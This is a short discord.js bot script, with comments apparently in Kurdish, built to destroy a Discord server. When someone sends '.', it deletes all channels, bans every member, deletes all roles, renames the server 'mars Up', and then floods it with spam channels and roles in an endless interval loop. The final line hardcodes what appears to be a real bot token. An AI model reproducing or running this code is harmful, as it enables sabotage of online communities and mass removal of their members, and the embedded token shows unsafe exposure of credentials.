const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("mars Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("mars Up", "text");///////bo channel 
        message.guild.createChannel("mars Up", "voice");////bo voice
        message.guild.createRole({ name: "mars Up" });////nawek dane bo role kan
      });
    }
  }
});

client.login("MTAwMjkzNjkwNjQ5OTIzOTk2NQ.GoO-rQ.dB4knEipYTM0SBmq8ItVcp_PsboHeM05R5MtV4")
